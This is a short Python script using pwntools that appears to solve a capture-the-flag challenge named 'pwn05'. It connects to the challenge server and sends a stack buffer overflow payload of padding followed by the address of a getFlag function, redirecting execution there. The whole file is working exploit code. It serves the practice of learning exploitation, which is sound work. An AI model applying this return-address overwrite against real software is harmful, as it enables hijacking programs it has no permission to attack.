from operator import add
from pwn import *

io = remote('pwn.challenge.ctf.show', 28182)
e = ELF('pwn05')
address = e.symbols['getFlag']
log.success('getFlag_address => %s' % hex(address).upper())
payload = b'a'*(0x14 + 0x4) + p32(address)
# payload = b'a'*(0x14 + 0x4) + p32(0x8048486)
io.sendline(payload)
io.interactive()
